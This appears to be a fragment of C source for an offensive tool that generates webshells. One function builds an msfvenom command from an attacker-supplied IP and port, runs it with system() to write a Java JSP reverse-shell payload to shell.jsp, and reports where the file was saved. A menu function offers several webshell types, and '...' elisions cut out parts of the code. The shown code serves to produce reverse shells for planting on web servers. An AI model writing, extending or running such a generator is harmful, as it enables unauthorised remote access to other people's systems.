...
void generate_java_jsp_reverse_shell(char *ip, int port) {
    char current_dir[256];
    char command[512];
    ...
    if (fgets(user_input, sizeof(user_input), stdin) != NULL) {
        if (user_input[0] == '\n') {
            snprintf(command, sizeof(command),
                "msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%d -f raw -o shell.jsp",
                ip, port);

            printf("\n\nGenerating the Java JSP payload...\n");
            int result = system(command);

            if (result == 0) {
                if (getcwd(current_dir, sizeof(current_dir)) != NULL) {
                    printf("\n\nJava JSP reverse shell saved to: %s/shell.jsp\n", current_dir);
                } else {
                    perror("\n\nError getting current directory");
                }
            } else {
                printf("\n\nError: Failed to generate the Java JSP payload. Check your msfvenom installation.\n");
            }
        } else {
            printf("\n\nOops... Exited due to invalid input.\n");
            exit(1);
        }
    } else {
        printf("\n\nError: Failed to read input.\n");
...
void handle_webshells(char *ip, int port) {
    ...
    while (attempts > 0) {
        printf("\n\nSelect Webshell:\n\n"
               ...
               "3. Java JSP (Metasploit)\n"
               "\n\nChoose an option (1-3, any other key will show an error): ");
        if (scanf("%d", &choice) == 1) {
            switch (choice) {
                case 1:
                ...
                case 2:
                    ...
                    return;
                case 3:
                    generate_java_jsp_reverse_shell(ip, port);
                    return;
                default:
                    printf("\n\nError: Choose a valid option (1 to 3).\n");
                    clear_input_buffer();
                    attempts--;
            }
        } else {
            printf("\n\nError: Invalid input. Choose a valid option (1 to 3).\n");
            clear_input_buffer();
            attempts--;
        }
    }
